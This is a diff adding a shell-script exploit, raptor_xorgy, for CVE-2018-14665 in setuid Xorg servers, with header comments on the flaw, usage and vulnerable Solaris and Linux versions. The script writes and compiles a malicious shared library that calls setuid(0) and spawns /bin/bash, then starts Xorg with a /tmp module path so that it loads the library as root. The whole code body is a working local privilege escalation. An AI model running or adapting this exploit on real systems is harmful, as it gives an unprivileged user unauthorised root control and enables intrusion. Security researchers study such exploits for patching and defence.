@@ -1,0 +1,70 @@
+#!/bin/sh
+
+#
+# raptor_xorgy - xorg-x11-server LPE via modulepath switch
+# Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>
+#
+# A flaw was found in xorg-x11-server before 1.20.3. An incorrect permission 
+# check for -modulepath and -logfile options when starting Xorg. X server 
+# allows unprivileged users with the ability to log in to the system via 
+# physical console to escalate their privileges and run arbitrary code under 
+# root privileges (CVE-2018-14665).
+#
+# This exploit variant triggers the bug in the -modulepath command line switch
+# to load a malicious X11 module in order to escalate privileges to root on
+# vulnerable systems. This technique is less invasive than exploiting the 
+# -logfile switch, however the gcc compiler must be present in order for it to
+# work out of the box. Alternatively, you must use a pre-compiled malicious .so
+# compatible with the target system and modify the exploit accordingly.
+#
+# It works very reliably on Solaris 11.4 and should work on most vulnerable
+# Linux distributions (though I haven't tested it). For some reason, it fails to
+# obtain uid 0 on OpenBSD... They might have an additional protection in place.
+#
+# Thanks to @alanc and @nushinde for discussing this alternative vector.
+#
+# See also:
+# https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm
+# https://github.com/0xdea/exploits/blob/master/solaris/raptor_solgasm
+# https://www.securepatterns.com/2018/10/cve-2018-14665-another-way-of.html
+# https://nvd.nist.gov/vuln/detail/CVE-2006-0745
+#
+# Usage:
+# raptor@stalker:~$ chmod +x raptor_xorgy
+# raptor@stalker:~$ ./raptor_xorgy
+# [...]
+# root@stalker:~# id
+# uid=0(root) gid=0(root)
+#
+# Vulnerable platforms (setuid Xorg 1.19.0 - 1.20.2):
+# Oracle Solaris 11 X86 [tested on 11.4.0.0.1.15.0 with Xorg 1.19.5]
+# Oracle Solaris 11 SPARC [untested]
+# CentOS Linux 7 [untested, it should work]
+# Red Hat Enterprise Linux 7 [untested]
+# Ubuntu Linux 18.10 [untested]
+# Ubuntu Linux 18.04 LTS [untested]
+# Ubuntu Linux 16.04 LTS [untested]
+# Debian GNU/Linux 9 [untested]
+# [...]
+#
+
+echo "raptor_xorgy - xorg-x11-server LPE via modulepath switch"
+echo "Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>"
+echo
+
+# prepare the payload
+cat << EOF > /tmp/pwned.c
+_init()
+{
+	setuid(0);
+	setgid(0);
+	system("/bin/bash");
+}
+EOF
+# libglx.so should be a good target, refer to Xorg logs for other candidates
+gcc -fPIC -shared -nostartfiles -w /tmp/pwned.c -o /tmp/libglx.so
+if [ $? -ne 0 ]; then echo; echo "error: cannot compile /tmp/pwned.c"; exit; fi
+
+# trigger the bug
+echo "Got root?"
+Xorg -modulepath ",/tmp" :1
